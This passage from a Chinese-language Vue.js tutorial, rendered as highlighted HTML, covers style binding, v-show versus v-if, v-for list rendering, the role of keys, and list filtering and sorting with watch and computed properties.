<span class="hljs-attr">class</span>=<span class="hljs-string">&quot;basic&quot;</span> <span class="hljs-attr">:style</span>=<span class="hljs-string">&quot;&#123;fontSize: fsize+&#x27;px&#x27;&#125;&quot;</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 绑定style样式 --对象写法 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;basic&quot;</span> <span class="hljs-attr">:style</span>=<span class="hljs-string">&quot;styleObj&quot;</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 绑定style样式 --数组写法 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;basic&quot;</span> <span class="hljs-attr">:style</span>=<span class="hljs-string">&quot;[styleObj,styleObj2]&quot;</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">data</span>:&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;Vue&#x27;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">mood</span>:<span class="hljs-string">&#x27;normal&#x27;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">classArr</span>:[<span class="hljs-string">&#x27;atguigu1&#x27;</span>,<span class="hljs-string">&#x27;atguigu2&#x27;</span>,<span class="hljs-string">&#x27;atguigu3&#x27;</span>],</span><br><span class="language-javascript">            <span class="hljs-attr">classObj</span>:&#123;</span><br><span class="language-javascript">                <span class="hljs-attr">atguigu1</span>:<span class="hljs-literal">false</span>,</span><br><span class="language-javascript">                <span class="hljs-attr">atguigu2</span>:<span class="hljs-literal">false</span></span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript">            <span class="hljs-attr">fsize</span>:<span class="hljs-number">40</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">styleObj</span>:&#123;</span><br><span class="language-javascript">                <span class="hljs-attr">fontSize</span>:<span class="hljs-string">&#x27;40px&#x27;</span>,</span><br><span class="language-javascript">                <span class="hljs-attr">color</span>:<span class="hljs-string">&#x27;red&#x27;</span>,</span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript">            <span class="hljs-attr">styleObj2</span>:&#123;</span><br><span class="language-javascript">                <span class="hljs-attr">backgroundColor</span>:<span class="hljs-string">&#x27;orange&#x27;</span></span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-attr">methods</span>:&#123;</span><br><span class="language-javascript">            <span class="hljs-title function_">changeMood</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">                <span class="hljs-keyword">const</span> arr = [<span class="hljs-string">&#x27;happy&#x27;</span>,<span class="hljs-string">&#x27;sad&#x27;</span>,<span class="hljs-string">&#x27;normal&#x27;</span>]</span><br><span class="language-javascript">                <span class="hljs-keyword">const</span> index =  <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>()*<span class="hljs-number">3</span>)</span><br><span class="language-javascript">                <span class="hljs-variable language_">this</span>.<span class="hljs-property">mood</span> = arr[index]</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="条件渲染"><a href="#条件渲染" class="headerlink" title="条件渲染"></a>条件渲染</h2><h3 id="v-show"><a href="#v-show" class="headerlink" title="v-show"></a><strong>v-show</strong></h3><ul><li><p>用法：</p><p>根据表达式之真假值，切换元素的 <code>display</code> CSS property。(也就是是否显示)</p><p>当条件变化时该指令触发过渡效果。</p></li><li><p>例</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">v-show</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span>欢迎来到&#123;&#123;name&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">v-show</span>=<span class="hljs-string">&quot;false&quot;</span>&gt;</span>欢迎来到&#123;&#123;name&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>  //不显示，等同于display:none<br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">v-show</span>=<span class="hljs-string">&quot;1===1&quot;</span>&gt;</span>欢迎来到&#123;&#123;name&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ul><p>​注意，<code>v-show</code> 不支持 <code>&lt;template&gt;</code> 元素，也不支持 <code>v-else</code>。</p><h3 id="v-if"><a href="#v-if" class="headerlink" title="v-if"></a><strong>v-if</strong></h3><ul><li><p>用法：</p><p>根据表达式的值的 truthiness 来有条件地渲染元素。在切换时元素及它的数据绑定&#x2F;组件被销毁并重建。如果元素是<code> &lt;template&gt;</code>，将提出它的内容作为条件块。</p><p>当条件变化时该指令触发过渡效果。</p></li><li><p>例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">&quot;false&quot;</span>&gt;</span>欢迎来到&#123;&#123;name&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span> //不仅界面无法看到，连源代码都不存在<br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">&quot;1===1&quot;</span>&gt;</span>欢迎来到&#123;&#123;name&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>可以配合v-else-if和v-else使用，但要连着用，结构不能被打断</p></li><li><p><strong>在<code>&lt;template&gt;</code>元素上使用 v-if 条件渲染分组</strong></p><p>当想切换多个元素，又不想破坏结构，可以使用 <code>&lt;template&gt;</code> 元素进行包裹。</p><p>最终的渲染结果将不包含 <code>&lt;template&gt;</code> 元素。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">&quot;n===1&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>Angular<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>React<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>Vue<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="v-if-vs-v-show"><a href="#v-if-vs-v-show" class="headerlink" title="v-if vs v-show"></a>v-if vs v-show</h3><p><code>v-if</code> 是“真正”的条件渲染，因为它会确保在切换过程中条件块内的事件监听器和子组件适当地被<strong>销毁和重建</strong>。<code>v-show</code>只是修改display。</p><p><code>v-if</code> 也是<strong>惰性的</strong>。若渲染之初条件为假，则什么也不做，知道条件第一次变为真才会开始渲染。</p><p><code>v-show</code>有更高的初始渲染开销，<code>v-if</code>有更高的切换开销。</p><p><strong>若需要频繁切换——选择<code>v-show</code>.</strong></p><p><strong>若运行时条件很少改变——选择<code>v-if</code>.</strong></p><h2 id="列表渲染"><a href="#列表渲染" class="headerlink" title="列表渲染"></a>列表渲染</h2><h3 id="v-for"><a href="#v-for" class="headerlink" title="v-for"></a>v-for</h3><p><strong>v-for 遍历数组、对象、字符串（用得少）、指定次数（用的少）</strong>。</p><p><strong>用法</strong>：</p><p>基于源数据多次渲染元素或模板块。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;(item,index) in items&quot;</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">&quot;yyy&quot;</span>&gt;</span><br>  &#123;&#123; item.text &#125;&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>案例1：</p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2023-11-24%20%E4%B8%8B%E5%8D%889.32.28.png" alt="人员列表" style="zoom:50%;" /><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;body&gt;<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>人员列表<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;(person,index) in persons&quot;</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">&quot;person.id&quot;</span>&gt;</span></span><br><span class="language-xml">                &#123;&#123;person.name&#125;&#125;-&#123;&#123;person.age&#125;&#125;</span><br><span class="language-xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>&lt;/body&gt;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span></span><br><span class="language-javascript"><span class="language-xml">    <span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#root&#x27;</span>,</span></span><br><span class="language-javascript"><span class="language-xml">    <span class="hljs-attr">data</span>:&#123;</span></span><br><span class="language-javascript"><span class="language-xml">        <span class="hljs-attr">persons</span>:[</span></span><br><span class="language-javascript"><span class="language-xml">            &#123;<span class="hljs-attr">id</span>:<span class="hljs-string">&#x27;001&#x27;</span>,<span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;张三&#x27;</span>,<span class="hljs-attr">age</span>:<span class="hljs-number">18</span>&#125;,</span></span><br><span class="language-javascript"><span class="language-xml">            &#123;<span class="hljs-attr">id</span>:<span class="hljs-string">&#x27;002&#x27;</span>,<span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;李四&#x27;</span>,<span class="hljs-attr">age</span>:<span class="hljs-number">19</span>&#125;,</span></span><br><span class="language-javascript"><span class="language-xml">            &#123;<span class="hljs-attr">id</span>:<span class="hljs-string">&#x27;003&#x27;</span>,<span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;王五&#x27;</span>,<span class="hljs-attr">age</span>:<span class="hljs-number">20</span>&#125;</span></span><br><span class="language-javascript"><span class="language-xml">        ]</span></span><br><span class="language-javascript"><span class="language-xml">    &#125;</span></span><br><span class="language-javascript"><span class="language-xml">&#125;)</span></span><br><span class="language-javascript"><span class="language-xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h3 id="关于key"><a href="#关于key" class="headerlink" title="关于key"></a><strong>关于key</strong></h3><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2023-11-24%20%E4%B8%8B%E5%8D%8810.01.14.png" alt="index作为key"></p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2023-11-24%20%E4%B8%8B%E5%8D%8810.01.49.png" alt="id作为key"></p><p><strong>面试题：react、vue中的key有什么作用？（key的内部原理）</strong></p><ul><li><p>虚拟DOM中key的作用：</p><p>key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】。</p><p>随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较。</p><p><strong>比较规则</strong>如下：</p><ol><li>旧虚拟DOM中<strong>找到了</strong>与新虚拟DOM相同的key<ol><li>若虚拟DOM中内容没变, 直接使用之前的真实DOM！</li><li>若虚拟DOM中内容变了, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM。</li></ol></li><li>旧虚拟DOM中<strong>未找到</strong>与新虚拟DOM相同的key<ol><li>创建新的真实DOM，随后渲染到到页面。</li></ol></li></ol></li><li><p>用index作为key可能会引发的问题：</p><ul><li><p>若对数据进行：逆序添加、逆序删除等破坏顺序操作:</p><p>会产生没有必要的真实DOM更新 &#x3D;&#x3D;&gt; 界面效果没问题, 但效率低。</p></li><li><p>如果结构中还包含输入类的DOM：</p><p>会产生错误DOM更新 &#x3D;&#x3D;&gt; 界面有问题。</p></li></ul></li><li><p>开发中如何选择key?</p><ul><li>最好使用每条数据的唯一标识作为key, 比如id、手机号、身份证号、学号等唯一值。</li><li>如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，使用index作为key是没有问题的。</li></ul></li></ul><h3 id="案例：列表过滤"><a href="#案例：列表过滤" class="headerlink" title="案例：列表过滤"></a>案例：列表过滤</h3><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2023-11-26%20%E4%B8%8A%E5%8D%8810.44.13.png" alt="列表过滤图例" style="zoom:50%;" /><p>输入字进行模糊查询。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 遍历数组 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>人员列表<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;请输入名字&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;keyWord&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;(p,index) in filPersons&quot;</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">&quot;index&quot;</span>&gt;</span><br>            &#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125;-&#123;&#123;p.sex&#125;&#125;<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>使用watch监视实现：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 用watch实现</span><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;<br>        <span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#root&#x27;</span>,<br>        <span class="hljs-attr">data</span>:&#123;<br>            <span class="hljs-attr">keyWord</span>:<span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-attr">persons</span>:[<br>                &#123;<span class="hljs-attr">id</span>:<span class="hljs-string">&#x27;001&#x27;</span>,<span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;马冬梅&#x27;</span>,<span class="hljs-attr">age</span>:<span class="hljs-number">18</span>,<span class="hljs-attr">sex</span>:<span class="hljs-string">&#x27;女&#x27;</span>&#125;,<br>                &#123;<span class="hljs-attr">id</span>:<span class="hljs-string">&#x27;002&#x27;</span>,<span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;周冬雨&#x27;</span>,<span class="hljs-attr">age</span>:<span class="hljs-number">19</span>,<span class="hljs-attr">sex</span>:<span class="hljs-string">&#x27;女&#x27;</span>&#125;,<br>                &#123;<span class="hljs-attr">id</span>:<span class="hljs-string">&#x27;003&#x27;</span>,<span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;周杰伦&#x27;</span>,<span class="hljs-attr">age</span>:<span class="hljs-number">20</span>,<span class="hljs-attr">sex</span>:<span class="hljs-string">&#x27;男&#x27;</span>&#125;,<br>                &#123;<span class="hljs-attr">id</span>:<span class="hljs-string">&#x27;004&#x27;</span>,<span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;温兆伦&#x27;</span>,<span class="hljs-attr">age</span>:<span class="hljs-number">22</span>,<span class="hljs-attr">sex</span>:<span class="hljs-string">&#x27;男&#x27;</span>&#125;<br>            ],<br>            <span class="hljs-attr">filPersons</span>:[]<br>        &#125;,<br>        <span class="hljs-attr">watch</span>:&#123;<br>            <span class="hljs-attr">keyWord</span>:&#123;<br>                <span class="hljs-attr">immediate</span>:<span class="hljs-literal">true</span>,<br>                <span class="hljs-title function_">handler</span>(<span class="hljs-params">val</span>)&#123;<br>                    <span class="hljs-variable language_">this</span>.<span class="hljs-property">filPersons</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">persons</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">p</span>)=&gt;</span>&#123;<br>                    <span class="hljs-keyword">return</span> p.<span class="hljs-property">name</span>.<span class="hljs-title function_">indexOf</span>(val) !== -<span class="hljs-number">1</span><br>                &#125;)<br>                &#125;<br>            &#125;<br>        &#125;<br>&#125;)<br></code></pre></td></tr></table></figure><p>使用计算属性实现：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 用compute实现</span><br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;<br>        <span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#root&#x27;</span>,<br>        <span class="hljs-attr">data</span>:&#123;<br>            <span class="hljs-attr">keyWord</span>:<span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-attr">persons</span>:[<br>                &#123;<span class="hljs-attr">id</span>:<span class="hljs-string">&#x27;001&#x27;</span>,<span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;马冬梅&#x27;</span>,<span class="hljs-attr">age</span>:<span class="hljs-number">18</span>,<span class="hljs-attr">sex</span>:<span class="hljs-string">&#x27;女&#x27;</span>&#125;,<br>                &#123;<span class="hljs-attr">id</span>:<span class="hljs-string">&#x27;002&#x27;</span>,<span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;周冬雨&#x27;</span>,<span class="hljs-attr">age</span>:<span class="hljs-number">19</span>,<span class="hljs-attr">sex</span>:<span class="hljs-string">&#x27;女&#x27;</span>&#125;,<br>                &#123;<span class="hljs-attr">id</span>:<span class="hljs-string">&#x27;003&#x27;</span>,<span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;周杰伦&#x27;</span>,<span class="hljs-attr">age</span>:<span class="hljs-number">20</span>,<span class="hljs-attr">sex</span>:<span class="hljs-string">&#x27;男&#x27;</span>&#125;,<br>                &#123;<span class="hljs-attr">id</span>:<span class="hljs-string">&#x27;004&#x27;</span>,<span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;温兆伦&#x27;</span>,<span class="hljs-attr">age</span>:<span class="hljs-number">22</span>,<span class="hljs-attr">sex</span>:<span class="hljs-string">&#x27;男&#x27;</span>&#125;<br>            ]<br>        &#125;,<br>        <span class="hljs-attr">computed</span>:&#123;<br>            <span class="hljs-title function_">filPersons</span>(<span class="hljs-params"></span>)&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">persons</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">p</span>)=&gt;</span>&#123;<br>                    <span class="hljs-keyword">return</span> p.<span class="hljs-property">name</span>.<span class="hljs-title function_">indexOf</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">keyWord</span>) !== -<span class="hljs-number">1</span>   <br>                &#125;)<br>            &#125;<br>        &#125;<br>    &#125;)<br></code></pre></td></tr></table></figure><h3 id="案例：列表排序"><a href="#案例：列表排序" class="headerlink" title="案例：列表排序"></a>案例：列表排序</h3><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2022/%E6%88%AA%E5%B1%8F2023-11-26%20%E4%B8%8B%E5%8D%8812.09.59.png" alt="列表排序" style="zoom:50%;" /><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>  <span class="hljs-comment">&lt;!-- 遍历数组 --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>人员列表<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;请输入名字&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;keyWord&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;sortType=2&quot;</span>&gt;</span>年龄升序<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;sortType=1&quot;</span>&gt;</span>年龄降序<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;sortType=0&quot;</span>&gt;</span>原顺序<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;(p,index) in filPersons&quot;</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">&quot;p.id&quot;</span>&gt;</span><br>      &#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125;-&#123;&#123;p.sex&#125;&#125;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 用computed实现</span><br><span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;<br>  <span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#root&#x27;</span>,<br>  <span class="hljs-attr">data</span>:&#123;<br>    <span class="hljs-attr">keyWord</span>:<span class="hljs-string">&#x27;&#x27;</span>,<br>    <span class="hljs-attr">sortType</span>:<span class="hljs-number">0</span>, <span class="hljs-comment">//0：原顺序，1降序，2升序</span><br>    <span class="hljs-attr">persons</span>:[<br>      &#123;<span class="hljs-attr">id</span>:<span class="hljs-string">&#x27;001&#x27;</span>,<span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;马冬梅&#x27;</span>,<span class="hljs-attr">age</span>:<span class="hljs-number">19</span>,<span class="hljs-attr">sex</span>:<span class="hljs-string">&#x27;女&#x27;</span>&#125;,<br>      &#123;<span class="hljs-attr">id</span>:<span class="hljs-string">&#x27;002&#x27;</span>,<span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;周冬雨&#x27;</span>,<span class="hljs-attr">age</span>:<span class="hljs-number">30</span>,<span class="hljs-attr">sex</span>:<span class="hljs-string">&#x27;女&#x27;</span>&#125;,<br>      &#123;<span class="hljs-attr">id</span>:<span class="hljs-string">&#x27;003&#x27;</span>,<span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;周杰伦&#x27;</span>,<span class="hljs-attr">age</span>:<span class="hljs-number">20</span>,<span class="hljs-attr">sex</span>:<span 